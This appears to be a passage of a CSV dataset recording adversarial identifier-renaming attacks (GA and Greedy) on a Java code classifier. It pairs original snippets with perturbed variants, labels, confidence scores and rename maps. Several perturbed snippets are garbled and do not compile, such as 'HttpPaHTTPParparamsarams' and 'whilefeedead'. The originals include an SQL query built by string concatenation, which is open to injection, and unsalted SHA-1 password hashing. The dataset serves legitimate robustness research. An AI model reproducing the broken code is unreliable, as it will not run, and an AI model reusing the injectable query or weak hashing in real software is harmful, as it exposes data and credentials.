",151,"    public static String GetContent(HttpUriRequest req) throws Exception {
        StringBuffer bm = new StringBuffer();
        HttpClient c = new DefaultHttpClient();
        HttpPaHTTPParparamsarams = c.getParams();
        HttpConnectionParams.setConnectionTimeout(HTTPParparams, 30000);
        HttpConnectionParams.setSoTimeout(HTTPParparams, 50000);
        Httpoutput responscient.execute(req);
        HttpEntitwriterty = output.getEntity();
        if (writer != null) {
            BufferedReader source = new BufferedReader(new InputStreamReader(writer.GetContent(), ""UTF-8""), 8192);
            String line = null;
            while ((line = source.readLine()) != null) {
                bm.append(line + ""
"");
            }
            source.close();
        }
        return bm.toString();
    }
",LABEL_0,LABEL_0,0.6832116842269897,1,"getContent,request,sb,client,httpParams,response,entity,reader,line",,,,3,"getContent:GetContent,request:req,sb:bm,client:c,httpParams:HTTPParparams,response:output,entity:writer,reader:source,line:line,",1,GA,828,0.2966842214266459,ga,[]
222,"    public static String getSHADigest(String password) {
        String digest = null;
        MessageDigest sha = null;
        try {
            sha = MessageDigest.getInstance(""SHA-1"");
            sha.reset();
            sha.update(password.getBytes());
            byte[] pwhash = sha.digest();
            digest = ""{SHA}"" + new String(Base64.encode(pwhash));
        } catch (NoSuchAlgorithmException nsae) {
            CofaxToolsUtil.log(""Algorithme SHA-1 non supporte a la creation du hashage"" + nsae + id);
        }
        return digest;
    }
 <SPLIT>     public static SVNConfiguracion load(URL urlConfiguracion) {
        SVNConfiguracion configuracion = null;
        try {
            XMLDecoder xenc = new XMLDecoder(urlConfiguracion.openStream());
            configuracion = (SVNConfiguracion) xenc.readObject();
            configuracion.setFicheroConfiguracion(urlConfiguracion);
            xenc.close();
        } catch (Exception exception) {
            exception.printStackTrace();
        }
        return configuracion;
    }
",103,,LABEL_0,LABEL_0,LABEL_0,-1,"getSHADigest,password,digest,sha,pwhash",,,,0,,0,GA,1876,0.6641281763712565,failed,[]
223,"    public static void copyFile(File src, File dest, int bufSize, boolean force) throws IOException {
        if (dest.exists()) if (force) dest.delete(); else throw new IOException(""Cannot overwrite existing file: "" + dest.getName());
        byte[] buffer = new byte[bufSize];
        int read = 0;
        InputStream in = null;
        OutputStream out = null;
        try {
            in = new FileInputStream(src);
            out = new FileOutputStream(dest);
            while (true) {
                read = in.read(buffer);
                if (read == -1) break;
                out.write(buffer, 0, read);
            }
        } finally {
            if (in != null) try {
                in.close();
            } finally {
                if (out != null) out.close();
            }
        }
    }
 <SPLIT>     public void testReadHelloWorldTxt() throws Exception {
        final InputStream helloWorldIS = this.getClass().getClassLoader().getResourceAsStream(BASE_DIR + ""/HelloWorld.txt"");
        FileUtils.forceMkdir(new File(this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver""));
        final String helloWorldPath = this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver/HelloWorld.txt"";
        final FileOutputStream fileOutputStream = new FileOutputStream(new File(helloWorldPath));
        IOUtils.copy(helloWorldIS, fileOutputStream);
        IOUtils.closeQuietly(helloWorldIS);
        IOUtils.closeQuietly(fileOutputStream);
        LOG.info(""helloWorldPath: "" + helloWorldPath);
        final FSContentResolver contentResolver = new FSContentResolver();
        contentResolver.setRootFolderPath(this.testDir.getAbsolutePath());
        byte[] content = contentResolver.getContent(""org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:laksjdhalksdhfa"");
        assertNull(content);
        content = contentResolver.getContent(""/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
    }
",169,"    public static void transferDir(File resource, File part, int bufferLen, boolean store) throws IOException {
        if (part.exists()) if (store) part.delete(); else throw new IOException(""Cannot overwrite existing file: "" + part.getName());
        byte[] bulimit new byte[bufferLen];
        int play = 0;
        InputStream url = null;
        OutputStream url = null;
        try {
            in = urlw FileInputStream(resource);
            url = new FileOutputStream(part);
            while (true) {
               playd =urlnplayd(limit);
                if (play == -1) break;
               urlt.write(limit, 0, play);
            }
        } finally {
            if (url != null) try {
                url.close();
            } finally {
                if (url != null) url.close();
            }
        }
    }
",LABEL_1,LABEL_1,0.6136387586593628,1,"copyFile,src,dest,bufSize,force,buffer,read,in,out",,,,0,"copyFile:transferDir,src:resource,dest:part,bufSize:bufferLen,force:store,buffer:limit,read:play,in:url,out:url,",0,GA,842,0.3107815782229106,ga,[]
224,"    private static URL downLoadZippedFile(URL url, File destDir) throws Exception {
        URLConnection urlConnection = url.openConnection();
        File tmpFile = null;
        try {
            tmpFile = File.createTempFile(""remoteLib_"", null);
            InputStream in = null;
            FileOutputStream out = null;
            try {
                in = urlConnection.getInputStream();
                out = new FileOutputStream(tmpFile);
                IOUtils.copy(in, out);
            } finally {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            }
            unzip(tmpFile, destDir);
        } finally {
            if (tmpFile != null) {
                tmpFile.delete();
            }
        }
        URL localURL = destDir.toURI().toURL();
        return localURL;
    }
 <SPLIT>     private byte[] scramble411(String password, String seed) {
        MessageDigest md;
        try {
            md = MessageDigest.getInstance(""SHA-1"");
            byte[] passwordHashStage1 = md.digest(password.getBytes());
            md.reset();
            byte[] passwordHashStage2 = md.digest(passwordHashStage1);
            md.reset();
            md.update(seed.getBytes());
            md.update(passwordHashStage2);
            byte[] toBeXord = md.digest();
            int numToXor = toBeXord.length;
            for (int i = 0; i < numToXor; i++) {
                toBeXord[i] = (byte) (toBeXord[i] ^ passwordHashStage1[i]);
            }
            return toBeXord;
        } catch (NoSuchAlgorithmException e) {
            if (logger.isLoggable(Level.SEVERE)) {
                logger.log(Level.SEVERE, e.getMessage(), e);
            }
        }
        return null;
    }
",155,,LABEL_0,LABEL_0,LABEL_0,-1,"downLoadZippedFile,url,destDir,urlConnection,tmpFile,in,out,localURL",,,,0,,0,GA,2345,0.8471353093783061,failed,[]
225,"    static HashSet<Integer> readZoneIDs(String zoneFileName) {
        HashSet<Integer> zoneids = new HashSet<Integer>();
        try {
            URL url = zoneFileName.getClass().getResource(zoneFileName);
            LineNumberReader lnr = new LineNumberReader(new InputStreamReader(url.openStream()));
            String line = null;
            while ((line = lnr.readLine()) != null) zoneids.add(Integer.parseInt(line));
        } catch (Exception xc) {
            xc.printStackTrace();
        }
        return zoneids;
    }
 <SPLIT>     public ProjectDeploymentConfiguration createNewProjectDeploymentConfig(int projectID, String name, String description) throws AdaptationException {
        ProjectDeploymentConfiguration config = null;
        Connection connection = null;
        Statement statement = null;
        ResultSet resultSet = null;
        try {
            String query = ""INSERT INTO ProjectDeploymentConfigurations"" + ""(projectID, name, description) VALUES ("" + projectID + "", '"" + name + ""', '"" + description + ""')"";
            connection = DriverManager.getConnection(CONN_STR);
            statement = connection.createStatement();
            statement.executeUpdate(query);
            query = ""SELECT * FROM ProjectDeploymentConfigurations WHERE "" + "" projectID   = "" + projectID + ""  AND "" + "" name        = '"" + name + ""' AND "" + "" description = '"" + description + ""'"";
            resultSet = statement.executeQuery(query);
            if (!resultSet.next()) {
                connection.rollback();
                String msg = ""Attempt to create "" + ""ProjectDeploymentConfiguration failed."";
                log.error(msg);
                throw new AdaptationException(msg);
            }
            config = getProjectDeploymentConfiguration(resultSet);
            connection.commit();
        } catch (SQLException ex) {
            try {
                connection.rollback();
            } catch (Exception e) {
            }
            String msg = ""SQLException in createNewProjectDeploymentConfig"";
            log.error(msg, ex);
            throw new AdaptationException(msg, ex);
        } finally {
            try {
                resultSet.close();
            } catch (Exception ex) {
            }
            try {
                statement.close();
            } catch (Exception ex) {
            }
            try {
                connection.close();
            } catch (Exception ex) {
            }
        }
        return config;
    }
",108,,LABEL_0,LABEL_0,LABEL_0,-1,"readZoneIDs,zoneFileName,zoneids,url,lnr,line",,,,0,,0,GA,1894,0.6900647679964701,failed,[]
226,"    public static String uploadOrDeleteMediaOrTemplates(String action, String object, String numElements, HttpServletRequest req, HttpSession session) {
        FTPClient ftp = new FTPClient();
        CofaxToolsUser user = (CofaxToolsUser) session.getAttribute(""user"");
        StringBuffer links = new StringBuffer();
        StringBuffer folders = new StringBuffer();
        String folder = """";
        String server = """";
        String login = """";
        String password = """";
        String fileTransferFolder = CofaxToolsServlet.fileTransferFolder;
        String liveFolder = """";
        ArrayList servers = new ArrayList();
        StringBuffer message = new StringBuffer();
        message.append(""Status:<BR>"");
        if (action.equals(""Upload"")) {
            server = (String) user.workingPubConfigElementsHash.get(""TESTFTPSERVER"");
            login = (String) user.workingPubConfigElementsHash.get(""TESTFTPLOGIN"");
            password = (String) user.workingPubConfigElementsHash.get(""TESTFTPPASSWORD"");
            if (object.equals(""Media"")) {
                folder = (String) user.workingPubConfigElementsHash.get(""TESTIMAGESFOLDER"");
            }
            if (object.equals(""Templates"")) {
                folder = (String) user.workingPubConfigElementsHash.get(""TESTTEMPLATEFOLDER"");
            }
        }
        if (action.equals(""Delete"")) {
            login = (String) user.workingPubConfigElementsHash.get(""LIVEFTPLOGIN"");
            password = (String) user.workingPubConfigElementsHash.get(""LIVEFTPPASSWORD"");
            if (object.equals(""Media"")) {
                server = (String) user.workingPubConfigElementsHash.get(""LIVEIMAGESSERVER"");
                folder = (String) user.workingPubConfigElementsHash.get(""LIVEIMAGESFOLDER"");
            }
            if (object.equals(""Templates"")) {
                server = (String) user.workingPubConfigElementsHash.get(""LIVEFTPSERVER"");
                folder = (String) user.workingPubConfigElementsHash.get(""LIVETEMPLATEFOLDER"");
            }
        }
        ArrayList al = new ArrayList();
        int numElement = Integer.parseInt(numElements);
        for (int i = 0; i < numElement; i++) {
            String key = String.valueOf(i);
            String file = req.getParameter(key);
            if (file != null) {
                al.add(file);
            }
        }
        if (action.equals(""Upload"")) {
            try {
                int reply;
                ftp.connect(server);
                CofaxToolsUtil.log(ftp.getReplyString());
                reply = ftp.getReplyCode();
                if (!FTPReply.isPositiveCompletion(reply)) {
                    ftp.disconnect();
                    return (""FTP server refused connection."");
                } else {
                    ftp.login(login, password);
                }
                for (int ii = 0; ii < al.size(); ii++) {
                    String fileName = (String) al.get(ii);
                    String folderName = stripName(fileName);
                    fileName = stripPath(fileName);
                    try {
                        ftp.changeWorkingDirectory(folderName);
                        OutputStream output;
                        output = new FileOutputStream(fileTransferFolder + fileName);
                        ftp.retrieveFile(fileName, output);
                        CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates retrieving file: "" + ftp.getReplyString());
                        message.append(""Retrieving file "" + fileName + "" to local disk.<BR>"");
                        output.close();
                    } catch (java.io.IOException e) {
                        return (""CofaxToolsFTP uploadOrDeleteMediaOrTemplates ERROR: cannot write file"" + e);
                    }
                }
                ftp.logout();
                ftp.disconnect();
            } catch (IOException e) {
                CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates ERROR: Could not connect to server: "" + e);
                return (""Could not connect to server: "" + e);
            }
            login = (String) user.workingPubConfigElementsHash.get(""LIVEFTPLOGIN"");
            password = (String) user.workingPubConfigElementsHash.get(""LIVEFTPPASSWORD"");
            if (object.equals(""Media"")) {
                server = (String) user.workingPubConfigElementsHash.get(""LIVEIMAGESSERVER"");
                liveFolder = (String) user.workingPubConfigElementsHash.get(""LIVEIMAGESFOLDER"");
            }
            if (object.equals(""Templates"")) {
                server = (String) user.workingPubConfigElementsHash.get(""LIVEFTPSERVER"");
                liveFolder = (String) user.workingPubConfigElementsHash.get(""LIVETEMPLATEFOLDER"");
            }
            servers = splitServers(server);
            for (int iii = 0; iii < servers.size(); iii++) {
                try {
                    int reply;
                    String connectServer = (String) servers.get(iii);
                    ftp.connect(connectServer);
                    CofaxToolsUtil.log(ftp.getReplyString());
                    reply = ftp.getReplyCode();
                    if (!FTPReply.isPositiveCompletion(reply)) {
                        ftp.disconnect();
                        CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates ERROR: server refused connection: "" + connectServer);
                        return (""CofaxToolsFTP uploadOrDeleteMediaOrTemplates FTP server refused connection."");
                    } else {
                        ftp.login(login, password);
                    }
                    for (int ii = 0; ii < al.size(); ii++) {
                        String fileName = (String) al.get(ii);
                        CofaxToolsUtil.log(""Original String "" + fileName);
                        CofaxToolsUtil.log(""Search for "" + folder);
                        CofaxToolsUtil.log(""Replace "" + liveFolder);
                        String folderName = CofaxToolsUtil.replace(fileName, folder, liveFolder);
                        CofaxToolsUtil.log(""Results: "" + folderName);
                        folderName = stripName(folderName);
                        fileName = stripPath(fileName);
                        try {
                            InputStream io;
                            io = new FileInputStream(fileTransferFolder + fileName);
                            CofaxToolsUtil.log(""Reading file : "" + fileTransferFolder + fileName);
                            boolean directoryExists = ftp.changeWorkingDirectory(folderName);
                            if (directoryExists == false) {
                                CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates directory: "" + folderName + "" does not exist. Attempting to create."");
                                message.append(""Directory: "" + folderName + "" does not exist. Attempting to create.<BR>"");
                                boolean canCreatDir = ftp.makeDirectory(folderName);
                                CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates results: "" + canCreatDir);
                                message.append(""Results: "" + canCreatDir + ""<BR>"");
                            }
                            boolean isStored = ftp.storeFile(fileName, io);
                            CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates storing file: "" + fileName + "" in directory: "" + folderName);
                            CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates on server : "" + connectServer);
                            CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates results: "" + isStored + "" : "" + ftp.getReplyString());
                            message.append(""Storing file "" + fileName + ""<BR> to location "" + folderName + ""<BR> on server "" + connectServer + "".<BR>"");
                        } catch (java.io.IOException e) {
                            CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates cannot upload file"" + fileName + ""<BR>To path: "" + folderName + ""<BR>On server "" + connectServer);
                            return (""Cannot upload file"" + fileName + ""<BR>To path: "" + folderName + ""<BR>On server "" + connectServer);
                        }
                    }
                    ftp.logout();
                    ftp.disconnect();
                    message.append(""Success<BR><BR>"");
                } catch (IOException e) {
                    CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates could not connect to server: "" + e);
                    return (""Could not connect to server: "" + e);
                }
            }
            if (object.equals(""Templates"")) {
                String cSServers = (String) user.workingPubConfigElementsHash.get(""CACHESERVERS"");
                System.out.println(""getting cache servers: "" + cSServers);
                ArrayList cServers = splitServers(cSServers);
                for (int iiii = 0; iiii < cServers.size(); iiii++) {
                    String thisClearCacheServer = (String) cServers.get(iiii);
                    try {
                        String connectServer = (String) cServers.get(iiii);
                        for (int iiiii = 0; iiiii < al.size(); iiiii++) {
                            String thisFilePath = (String) al.get(iiiii);
                            String folderNameFileName = CofaxToolsUtil.replace(thisFilePath, folder, liveFolder);
                            String URLToClear = CofaxToolsServlet.removeTemplateCache + folderNameFileName;
                            CofaxToolsClearCache clear = new CofaxToolsClearCache(""HTTP://"" + thisClearCacheServer + URLToClear);
                            clear.start();
                            message.append(""Clearing Cache for "" + folderNameFileName + ""<BR>"");
                            message.append(""on server "" + thisClearCacheServer + ""<BR>Success<BR><BR>"");
                        }
                    } catch (Exception e) {
                        CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates ERROR: could not connect to server clearing cache "" + e);
                    }
                }
            }
            for (int i = 0; i < al.size(); i++) {
                String fileName = (String) al.get(i);
                String folderName = stripName(fileName);
                fileName = stripPath(fileName);
                File file = new File(fileTransferFolder + fileName);
                boolean delete = file.delete();
                CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates deleting file from local drive: "" + fileTransferFolder + fileName);
                CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates results: "" + delete);
            }
        }
        servers = splitServers(server);
        if (action.equals(""Delete"")) {
            for (int iii = 0; iii < servers.size(); iii++) {
                try {
                    int reply;
                    String connectServer = (String) servers.get(iii);
                    ftp.connect(connectServer);
                    CofaxToolsUtil.log(ftp.getReplyString());
                    reply = ftp.getReplyCode();
                    if (!FTPReply.isPositiveCompletion(reply)) {
                        ftp.disconnect();
                        CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates ERROR: FTP server refused connection: "" + connectServer);
                        return (""FTP server refused connection."");
                    } else {
                        ftp.login(login, password);
                    }
                    for (int ii = 0; ii < al.size(); ii++) {
                        String fileName = (String) al.get(ii);
                        String folderName = stripName(fileName);
                        fileName = stripPath(fileName);
                        try {
                            ftp.changeWorkingDirectory(folderName);
                            ftp.deleteFile(fileName);
                            CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates deleting file: "" + fileName + "" from directory: "" + folderName);
                            CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates on server : "" + connectServer);
                            CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates results: "" + ftp.getReplyString());
                            message.append(""Deleting file "" + fileName + ""<BR>"");
                            message.append(""from folder "" + folderName + ""<BR>"");
                            message.append(""on server "" + connectServer + ""<BR>"");
                        } catch (java.io.IOException e) {
                            return (""CofaxToolsFTP uploadOrDeleteMediaOrTemplates ERROR: cannot delete file"" + fileName);
                        }
                    }
                    message.append(""Success<BR><BR>"");
                    ftp.logout();
                    ftp.disconnect();
                } catch (IOException e) {
                    CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates ERROR: Could not connect to server: "" + e);
                    return (""Could not connect to server: "" + e);
                }
            }
            if (object.equals(""Templates"")) {
                String cISServers = (String) user.workingPubConfigElementsHash.get(""CACHESERVERS"");
                ArrayList cIServers = splitServers(cISServers);
                for (int iiiiii = 0; iiiiii < cIServers.size(); iiiiii++) {
                    String thisClearCacheIServer = (String) cIServers.get(iiiiii);
                    try {
                        String connectServer = (String) cIServers.get(iiiiii);
                        for (int iiiiiii = 0; iiiiiii < al.size(); iiiiiii++) {
                            String thisFilePathI = (String) al.get(iiiiiii);
                            String URLToClearI = CofaxToolsServlet.removeTemplateCache + thisFilePathI;
                            CofaxToolsClearCache clearI = new CofaxToolsClearCache(""HTTP://"" + thisClearCacheIServer + URLToClearI);
                            clearI.start();
                            message.append(""Clearing Cache for "" + thisFilePathI + ""<BR>"");
                            message.append(""on server "" + thisClearCacheIServer + ""<BR>Success<BR><BR>"");
                        }
                    } catch (Exception e) {
                        CofaxToolsUtil.log(""CofaxToolsFTP uploadOrDeleteMediaOrTemplates ERROR clearing cache "" + e);
                    }
                }
            }
        }
        return (message.toString());
    }
 <SPLIT>     public static String encodePassword(String _originalPassword) {
        MessageDigest md = null;
        String encodedPassword = null;
        try {
            md = MessageDigest.getInstance(""SHA-1"");
            md.update(_originalPassword.getBytes(""UTF-8""));
            encodedPassword = (new BASE64Encoder()).encode(md.digest());
        } catch (NoSuchAlgorithmException _e) {
            _e.printStackTrace();
        } catch (UnsupportedEncodingException _e) {
            _e.printStackTrace();
        }
        return encodedPassword;
    }
",2233,,LABEL_0,LABEL_0,LABEL_0,-1,"uploadOrDeleteMediaOrTemplates,action,object,numElements,req,session,ftp,user,links,folders,folder,server,login,password,fileTransferFolder,liveFolder,servers,message",,,,0,,0,GA,6303,3.630904046694438,failed,[]
227,"    public static void main(final String args[]) {
        if (args.length < 2 || (args.length == 3 && !""-d"".equals(args[0]))) {
            System.out.println(""Usage: AdapterGenerator [Options] <PrologFile> <ClassPath>"");
            System.out.println(""       where the framework is the first element in the class path"");
            System.out.println(""Options: -d Enables the generation of debug output"");
            return;
        }
        boolean debug = args.length == 3;
        File prologFile = new File(debug ? args[1] : args[0]);
        if (!prologFile.isFile()) {
            System.out.println(""The given file does not exist."");
            return;
        }
        File targetFile = new File(prologFile.getParentFile(), prologFile.getName().substring(0, prologFile.getName().lastIndexOf(""."")) + "".jar"");
        String source;
        try {
            source = FileUtils.readFileToString(prologFile);
        } catch (IOException ex) {
            System.out.println(""Error reading file: "" + ex.getMessage());
            return;
        }
        Parser myParser = new PrologParserImpl();
        PrologProgram myProgram;
        try {
            myProgram = (PrologProgram) myParser.parse(source);
        } catch (Exception ex) {
            System.out.println(""Could not parse file: "" + ex.getMessage());
            return;
        }
        try {
            FactVisitor myVisitor = new FactVisitor();
            myVisitor.visit(myProgram);
            Map<String, TypeGenerationInfo> adapterLayer = myVisitor.getAdapterLayer();
            if (adapterLayer.size() == 0) {
                System.out.println(""No adapters to generate, "" + ""did you forget to run the comeback rules?"");
                return;
            }
            URLClassLoader classLoader = createClassLoaderFromClassPath(debug ? args[2] : args[1]);
            ClassWriter adapterWriter = new ClassWriter(new JarEntryWriter(targetFile));
            AdapterAnnotationGenerator annotationGenerator = new AdapterAnnotationGenerator();
            Type annotationType = Type.getObjectType(""net/sourceforge/comeback/Adapter"");
            adapterWriter.writeClass(annotationType.getClassName(), annotationGenerator.createAnnotation(annotationType));
            AdapterLookupGenerator lookupWriter = new AdapterLookupGenerator(Type.getObjectType(""net/sourceforge/comeback/Adapters""), annotationType);
            GenerationContext context = new GenerationContext(adapterLayer, classLoader, annotationType, lookupWriter, adapterWriter);
            context.setGenerateDebugOutput(debug);
            Iterator<TypeGenerationInfo> iterator = adapterLayer.values().iterator();
            while (iterator.hasNext()) {
                TypeGenerationInfo info = iterator.next();
                context.generateAdapter(info);
            }
            ByteArrayOutputStream serialized = new ByteArrayOutputStream();
            ObjectOutputStream out = new ObjectOutputStream(serialized);
            out.writeObject(adapterLayer);
            out.close();
            adapterWriter.writeResource(""net/sourceforge/comeback/adapterlayer.ser"", serialized.toByteArray());
            String[] sharedClassesPrefixes = new String[2];
            Assembler assembler = new Assembler(adapterWriter);
            PatternClassFilter filter = new PatternClassFilter();
            URL url = Main.class.getResource(""/"" + Main.class.getName().replace('.', '/') + "".class"");
            JarURLConnection connection = (JarURLConnection) url.openConnection();
            sharedClassesPrefixes[0] = assembler.assemble(connection.getJarFile(), filter);
            filter = new PatternClassFilter();
            url = Type.class.getResource(""/"" + Type.class.getName().replace('.', '/') + "".class"");
            connection = (JarURLConnection) url.openConnection();
            sharedClassesPrefixes[1] = assembler.assemble(connection.getJarFile(), filter);
            String tmp = debug ? args[2] : args[1];
            adapterWriter.writeClass(lookupWriter.getType().getClassName(), lookupWriter.createAdapterLookup(adapterLayer.values(), tmp.substring(tmp.lastIndexOf(File.pathSeparator) + 1), sharedClassesPrefixes));
            adapterWriter.close();
        } catch (Throwable e) {
            e.printStackTrace();
            return;
        }
    }
 <SPLIT>         private void loadBinaryStream(String streamName, InputStream streamToLoad, long sz, HttpServletRequest req, HttpServletResponse resp) throws IOException {
            resp.setContentType(getContentType(req, streamName));
            resp.setHeader(""Content-Disposition"", ""inline;filename="" + streamName);
            resp.setContentLength((int) sz);
            OutputStream out = resp.getOutputStream();
            BufferedOutputStream bos = new BufferedOutputStream(out, 2048);
            try {
                IOUtils.copy(streamToLoad, bos);
            } finally {
                IOUtils.closeQuietly(streamToLoad);
                IOUtils.closeQuietly(bos);
            }
            getCargo().put(GWT_ENTRY_POINT_PAGE_PARAM, null);
        }
",764,,LABEL_0,LABEL_1,,-4,"debug,prologFile,targetFile,source,myParser,myProgram,myVisitor,adapterLayer,classLoader,adapterWriter,annotationGenerator,out",,,,0,,0,Greedy,1,0.000937954584757487,,[]
228,"    public static boolean decodeFileToFile(final String infile, final String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            final byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (final java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (final Exception exc) {
            }
            try {
                out.close();
            } catch (final Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public int run(String[] args) throws Exception {
        if (args.length < 2) {
            System.err.println(""Download dir local"");
            return 1;
        }
        OutputStream out = new FileOutputStream(args[1]);
        Path srcDir = new Path(args[0]);
        Configuration conf = new Configuration();
        FileSystem srcFS = FileSystem.get(conf);
        if (!srcFS.getFileStatus(srcDir).isDirectory()) {
            System.err.println(args[0] + "" is not a directory."");
            return 1;
        }
        try {
            FileStatus contents[] = srcFS.listStatus(srcDir);
            for (int i = 0; i < contents.length; i++) {
                if (contents[i].isFile()) {
                    System.err.println(contents[i].getPath());
                    InputStream in = srcFS.open(contents[i].getPath());
                    try {
                        IOUtils.copyBytes(in, out, conf, false);
                    } finally {
                        in.close();
                    }
                }
            }
        } finally {
            out.close();
        }
        return 0;
    }
",200,"    public static boolean decodeFileToFile(final String minfile, final String OutFile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            iin= new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(minfile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(OutFile));
            final byte[] url = new byte[65536];
            int  connect = -1;
            while connectead =  connectead(url)) >= 0) {
                out.write(url, 0,  connect);
            }
            success = true;
        } catch (final java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (final Exception exc) {
            }
            try {
                out.close();
            } catch (final Exception exc) {
            }
        }
        return success;
    }
",LABEL_1,LABEL_1,0.6307471394538879,1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,12,"decodeFileToFile:decodeFileToFile,infile:minfile,outfile:OutFile,in:in,out:out,buffer:url,read: connect,success:success,",4,GA,453,0.16520193417867024,ga,[]
229,"    private void moveFile(File orig, File target) throws IOException {
        byte buffer[] = new byte[1000];
        int bread = 0;
        FileInputStream fis = new FileInputStream(orig);
        FileOutputStream fos = new FileOutputStream(target);
        while (bread != -1) {
            bread = fis.read(buffer);
            if (bread != -1) fos.write(buffer, 0, bread);
        }
        fis.close();
        fos.close();
        orig.delete();
    }
 <SPLIT>     public static DigitalObjectContent byReference(final InputStream inputStream) {
        try {
            File tempFile = File.createTempFile(""tempContent"", ""tmp"");
            tempFile.deleteOnExit();
            FileOutputStream out = new FileOutputStream(tempFile);
            IOUtils.copyLarge(inputStream, out);
            out.close();
            return new ImmutableContent(tempFile);
        } catch (IOException e) {
            e.printStackTrace();
        }
        throw new IllegalStateException(""Could not create content for input stream: "" + inputStream);
    }
",103,,LABEL_1,LABEL_1,LABEL_1,-1,"moveFile,orig,target,buffer,bread,fis,fos",,,,0,,0,GA,2140,0.7604947606722514,failed,[]
230,"    public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     private void createButtonCopyToClipboard() {
        buttonCopyToClipboard = new Button(shell, SWT.PUSH);
        buttonCopyToClipboard.setText(""Co&py to Clipboard"");
        buttonCopyToClipboard.setLayoutData(SharedStyle.relativeToBottomRight(buttonClose));
        buttonCopyToClipboard.addSelectionListener(new SelectionAdapter() {

            @Override
            public void widgetSelected(final SelectionEvent event) {
                IOUtils.copyToClipboard(Version.getEnvironmentReport());
            }
        });
    }
",194,"    public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] url = new byte[65536];
            int feed = -1;
            whilefeedead = feedead(url)) >= 0) {
                out.write(url, 0, feed);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
",LABEL_1,LABEL_1,0.561532735824585,1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,16,"decodeFileToFile:decodeFileToFile,infile:infile,outfile:outfile,in:in,out:out,buffer:url,read:feed,success:success,",6,GA,400,0.14506063858668009,ga,[]
231,"    private void getRandomGUID(boolean secure) {
        MessageDigest md5 = null;
        StringBuffer sbValueBeforeMD5 = new StringBuffer();
        try {
            md5 = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            System.out.println(""Error: "" + e);
        }
        try {
            long time = System.currentTimeMillis();
            long rand = 0;
            if (secure) {
                rand = mySecureRand.nextLong();
            } else {
                rand = myRand.nextLong();
            }
            sbValueBeforeMD5.append(s_id);
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(time));
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(rand));
            valueBeforeMD5 = sbValueBeforeMD5.toString();
